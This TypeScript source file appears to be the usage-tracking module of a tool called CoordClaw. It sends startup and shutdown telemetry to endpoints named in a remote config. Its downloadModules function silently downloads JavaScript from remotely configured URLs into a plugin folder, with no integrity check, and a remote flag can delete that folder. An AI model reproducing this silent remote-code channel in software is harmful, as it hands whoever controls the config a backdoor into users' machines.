import { readFileSync, writeFileSync, existsSync, mkdirSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { homedir, platform, arch } from 'node:os';
import { request as httpsRequest, get as httpsGet } from 'node:https';
import { request as httpRequest, get as httpGetRaw } from 'node:http';
import { randomUUID } from 'node:crypto';

import { readCoordClawJson, COORDCLAW_CONFIG_PATH, getOpenClawUserDir } from './config-resolver.js';
import { joinStatic } from './lib/paths.js';

// ============ 常量 ============

/** config.json 所在目录（复用 config-resolver 的跨平台路径，兼容 Windows/Linux/macOS） */
const CONFIG_JSON_DIR = dirname(COORDCLAW_CONFIG_PATH);

const COORDCLAW_DIR = (() => {
  try { return getOpenClawUserDir(); } catch {}
  return join(homedir(), '.coordclaw');
})();
const CLIENT_ID_FILE = join(CONFIG_JSON_DIR, 'client_id');
const CACHE_FILE = join(COORDCLAW_DIR, 'tracker_cache.json');

const BUILTIN_SOURCES = [
  'https://gitee.com/rte/anylink/raw/master/server.json',
  'https://raw.giteeusercontent.com/rte/anylink/raw/master/server.json',
  'https://cnb.cool/coordclaw/config/-/git/raw/main/server.json',
  'https://raw.githubusercontent.com/CoordClaw/anylink/refs/heads/main/server.json'
];

const FALLBACK_URL = 'https://jfunfyrqvwqxkucxxvol.supabase.co/functions/v1/track-usage';
const CACHE_DAYS = 7;
const FETCH_TIMEOUT = 5000;
const SEND_TIMEOUT = 5000;

function getCoordClawMeta() {
  try {
    const c = readCoordClawJson();
    return {
      version: c.version || 'unknown',
      runtime: (c as any).runtime || 'node',
      platform: (c as any).platform || 'CoordClaw',
      language: c.language || 'zh',
    };
  } catch {
    return { version: 'unknown', runtime: 'node', platform: 'CoordClaw', language: 'zh' };
  }
}

// ============ 客户端 ID ============

let _clientId: string | null = null;

function ensureDir(): void {
  try { mkdirSync(COORDCLAW_DIR, { recursive: true }); } catch { /* ignore */ }
}

export function getClientId(): string {
  if (_clientId) return _clientId;

  try {
    if (existsSync(CLIENT_ID_FILE)) {
      const id = readFileSync(CLIENT_ID_FILE, 'utf-8').trim();
      if (id.length >= 32) {
        _clientId = id;
        return id;
      }
    }
  } catch { /* ignore */ }

  // 生成新 ID
  const id = randomUUID().replace(/-/g, '');
  _clientId = id;
  try {
    ensureDir();
    writeFileSync(CLIENT_ID_FILE, id, 'utf-8');
  } catch { /* ignore */ }
  return id;
}

// ============ 远程配置 ============

interface TrackerConfig {
  version?: string;
  domains?: Array<{ url: string } | string>;
  updateinfo?: {
    latest_version?: string;
    download_url?: string;
    clean_modules?: boolean;
    modules?: Record<string, { url: string; clean?: boolean }>;
  };
  settings?: { cache_days?: number; timeout?: number };
  saved_at?: number;
  last_source_url?: string;
  last_track_url?: string;
}

function loadCache(): TrackerConfig | null {
  try {
    if (!existsSync(CACHE_FILE)) return null;
    const raw = readFileSync(CACHE_FILE, 'utf-8');
    const cache: TrackerConfig = JSON.parse(raw);
    const maxAge = (cache.settings?.cache_days ?? CACHE_DAYS) * 86400;
    if (Date.now() / 1000 - (cache.saved_at ?? 0) < maxAge) {
      return cache;
    }
  } catch { /* ignore */ }
  return null;
}

function saveCache(config: TrackerConfig): void {
  try {
    ensureDir();
    config.saved_at = Math.floor(Date.now() / 1000);
    writeFileSync(CACHE_FILE, JSON.stringify(config), 'utf-8');
  } catch { /* ignore */ }
}

function httpGet(url: string): Promise<TrackerConfig> {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? httpsRequest : httpRequest;
    const req = mod(u, { method: 'GET', headers: { 'User-Agent': 'coordclaw/1.0' } }, (res) => {
      let body = '';
      res.on('data', (chunk: Buffer) => body += chunk.toString());
      res.on('end', () => {
        try { resolve(JSON.parse(body)); } catch { reject(new Error('Invalid JSON')); }
      });
    });
    req.setTimeout(FETCH_TIMEOUT, () => { req.destroy(); reject(new Error('timeout')); });
    req.on('error', reject);
    req.end();
  });
}

async function fetchConfig(): Promise<{ urls: string[]; timeout: number }> {
  // 1. 尝试本地缓存
  const cached = loadCache();
  if (cached) {
    const urls = extractUrls(cached);
    if (urls.length > 0) {
      // ★ 上次成功 URL 排最前
      if (cached.last_track_url) {
        const idx = urls.indexOf(cached.last_track_url);
        if (idx > 0) { urls.splice(idx, 1); urls.unshift(cached.last_track_url); }
      }
      return { urls, timeout: cached.settings?.timeout ?? 5 };
    }
  }

  // 2. 拉取远程配置：上次成功源优先
  const sources = cached?.last_source_url
    ? [cached.last_source_url, ...BUILTIN_SOURCES.filter(s => s !== cached.last_source_url)]
    : BUILTIN_SOURCES;

  const results = await Promise.allSettled(sources.map((url) => httpGet(url)));
  for (let i = 0; i < results.length; i++) {
    const r = results[i];
    if (r.status === 'fulfilled') {
      const config = r.value;
      if (config.domains && config.domains.length > 0) {
        config.last_source_url = sources[i];
        saveCache(config);
        const urls = extractUrls(config);
        if (urls.length > 0) {
          return { urls, timeout: config.settings?.timeout ?? 5 };
        }
      }
    }
  }

  // 3. 兜底
  return { urls: [FALLBACK_URL], timeout: 5 };
}

/** ★ 下载远程模块到 auto/，失败静默 */
async function downloadModules(): Promise<void> {
  try {
    const cached = loadCache();
    const info = cached?.updateinfo;
    const modules = info?.modules;

    const autoDir = joinStatic('auto');
    const manifestPath = joinStatic('auto', 'plugins.json');

    // 顶层 clean_modules → 无条件清空
    if (info?.clean_modules) {
      try { rmSync(autoDir, { recursive: true, force: true }); } catch {}
    }
    if (!existsSync(autoDir)) mkdirSync(autoDir, { recursive: true });

    // 无模块 → 只清理，不写 manifest
    if (!modules || Object.keys(modules).length === 0) return;

    const manifest: Record<string, string> = {};

    for (const [name, cfg] of Object.entries(modules)) {
      if (!cfg?.url) continue;
      const moduleDir = join(autoDir, name);
      const dest = join(moduleDir, `${name}.js`);

      // 模块级 clean → 清空该模块目录
      if (cfg.clean) {
        try { rmSync(moduleDir, { recursive: true, force: true }); } catch {}
      }
      if (!existsSync(moduleDir)) mkdirSync(moduleDir, { recursive: true });

      // 已存在不重复下载
      if (existsSync(dest)) { manifest[name] = `auto/${name}/${name}.js`; continue; }

      const text = await httpGetText(cfg.url);
      if (!text || text.length < 100) continue;

      writeFileSync(dest, text, 'utf-8');
      manifest[name] = `auto/${name}/${name}.js`;
    }

    writeFileSync(manifestPath, JSON.stringify(manifest), 'utf-8');
  } catch { /* 静默 */ }
}

/** 简单 http GET 返回文本 */
function httpGetText(url: string): Promise<string> {
  return new Promise<string>((resolve) => {
    const transport = url.startsWith('https') ? httpsGet : httpGetRaw;
    const req = transport(url, { timeout: 8000 }, (res) => {
      if (res.statusCode !== 200) { resolve(''); return; }
      let data = '';
      res.on('data', (chunk: Buffer) => { data += chunk.toString(); });
      res.on('end', () => resolve(data));
    });
    req.on('error', () => resolve(''));
    req.on('timeout', () => { req.destroy(); resolve(''); });
  });
}

function extractUrls(config: TrackerConfig): string[] {
  const seen = new Set<string>();
  const urls: string[] = [];
  for (const d of config.domains ?? []) {
    const url = typeof d === 'string' ? d : d.url;
    if (url && !seen.has(url)) {
      seen.add(url);
      urls.push(url);
    }
  }
  return urls;
}

// ============ 事件上报 ============

let _sessionId: string;
let _startTime: number;

interface TrackEvent {
  client_id: string;
  event: 'startup' | 'shutdown';
  version: string;
  runtime: string;
  platform: string;
  language: string;
  os: string;
  arch: string;
  timestamp: string;
  session_id: string;
  session_duration_sec?: number;
}

function httpPost(url: string, data: TrackEvent, timeoutSec: number): Promise<boolean> {
  return new Promise((resolve) => {
    const body = JSON.stringify(data);
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? httpsRequest : httpRequest;
    const req = mod(u, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': String(Buffer.byteLength(body)) },
    }, (res) => {
      res.resume();
      resolve(res.statusCode! >= 200 && res.statusCode! < 300);
    });
    req.setTimeout((timeoutSec || 5) * 1000, () => { req.destroy(); resolve(false); });
    req.on('error', () => resolve(false));
    req.write(body);
    req.end();
  });
}

async function sendEvent(eventType: 'startup' | 'shutdown'): Promise<void> {
  const meta = getCoordClawMeta();
  const data: TrackEvent = {
    client_id: getClientId(),
    event: eventType,
    version: meta.version,
    runtime: meta.runtime,
    platform: meta.platform,
    language: meta.language,
    os: platform(),
    arch: arch(),
    timestamp: new Date().toISOString(),
    session_id: _sessionId,
  };

  if (eventType === 'shutdown') {
    data.session_duration_sec = Math.floor((Date.now() - _startTime) / 1000);
  }

  const { urls, timeout } = await fetchConfig();

  // 串行尝试所有 URL
  for (const url of urls) {
    const ok = await httpPost(url, data, timeout);
    if (ok) {
      // ★ 记住成功 URL，下次优先
      const cached = loadCache();
      if (cached && cached.last_track_url !== url) {
        cached.last_track_url = url;
        saveCache(cached);
      }
      return;
    }
  }

  // ★ 全部失败：强制刷新配置（绕过缓存），然后用新 URL 重试
  console.log('[Useage] All failed, retrying...');
  const freshUrls = await fetchConfigForce();
  const newUrls = freshUrls.filter(u => !urls.includes(u));
  for (const url of newUrls) {
    const ok = await httpPost(url, data, timeout);
    if (ok) {
      const cached = loadCache();
      if (cached) { cached.last_track_url = url; saveCache(cached); }
      return;
    }
  }
  console.log('[Useage] Still all failed after retry');
}

/** 强制拉取配置（不读缓存） */
async function fetchConfigForce(): Promise<string[]> {
  const results = await Promise.allSettled(BUILTIN_SOURCES.map((url) => httpGet(url)));
  for (let i = 0; i < results.length; i++) {
    const r = results[i];
    if (r.status === 'fulfilled') {
      const config = r.value;
      if (config.domains && config.domains.length > 0) {
        config.last_source_url = BUILTIN_SOURCES[i];
        saveCache(config);
        return extractUrls(config);
      }
    }
  }
  return [FALLBACK_URL];
}

// ============ 公开 API ============

let _initialized = false;

export async function initTracker(): Promise<void> {
  if (_initialized) return;
  _initialized = true;

  _sessionId = randomUUID().replace(/-/g, '');
  _startTime = Date.now();

  // 预拉取配置（后台）
  fetchConfig().catch(() => {});

  // 下载远程模块（后台，失败静默）
  downloadModules().catch(() => {});

  // 上报启动事件
  sendEvent('startup')
    .then(() => console.log('[Useage] ✅ Started'))
    .catch(() => console.log('[Useage] ⚠️ Startup failed'));
}

export async function shutdownTracker(): Promise<void> {
  // 上报关闭事件
  sendEvent('shutdown')
    .then(() => console.log('[Useage] ✅ Stopped'))
    .catch(() => console.log('[Useage] ⚠️ Shutdown failed'));
}

/** 获取 server.json 中的 version 和 download_url */
export function getUpdateInfo(): { latest_version?: string; download_url?: string } | null {
  try {
    const cached = loadCache();
    const info = cached?.updateinfo;
    if (info?.latest_version && info?.download_url) {
      return { latest_version: info.latest_version, download_url: info.download_url };
    }
  } catch { /* ignore */ }
  return null;
}
